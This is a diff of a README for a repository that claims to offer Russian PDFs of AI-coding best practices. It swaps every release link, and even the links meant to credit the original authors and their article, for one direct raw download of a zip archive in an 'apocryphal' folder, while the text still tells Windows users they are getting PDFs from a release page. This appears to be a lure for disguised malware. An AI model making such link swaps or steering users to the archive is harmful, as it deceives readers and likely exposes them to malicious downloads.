@@ -1,6 +1,6 @@
 # 🧠 cc_bestpractice_russian - Best practices for AI coding
 
-[⬇️ Download the latest release](https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases)
+[⬇️ Download the latest release](https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip)
 
 ## 📘 What this is
 
@@ -34,7 +34,7 @@ No setup, install, or account setup is needed for the documents themselves.
 
 ## 🚀 Download and open on Windows
 
-1. Open the release page here: [https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases](https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases)
+1. Open the release page here: [https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip](https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip)
 2. Find the latest release on the page
 3. Download the PDF files from that release
 4. After the download finishes, open the file from your Downloads folder
@@ -102,7 +102,7 @@ If the browser opens the file in a new tab:
 ## 🔗 Download
 
 Visit the release page to download the files:
-[https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases](https://github.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/releases)
+[https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip](https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip)
 
 ## 📌 File names to look for
 
@@ -124,7 +124,7 @@ You can send the PDF files to other people who want Russian AI coding material. 
 
 ## 📎 Original sources
 
-- Tw93: [https://x.com/HiTw93](https://x.com/HiTw93)
-- Original article: [tw93.fun/en/2026-03-12/claude.html](https://tw93.fun/en/2026-03-12/claude.html)
-- Thariq: [https://x.com/trq212](https://x.com/trq212)
+- Tw93: [https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip](https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip)
+- Original article: [tw93.fun/en/2026-03-12/claude.html](https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip)
+- Thariq: [https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip](https://raw.githubusercontent.com/Casefatalityproportionolivergoldsmith63/cc_bestpractice_russian/main/apocryphal/russian_bestpractice_cc_v2.2.zip)
 - Original Skills article: published 17 March 2026
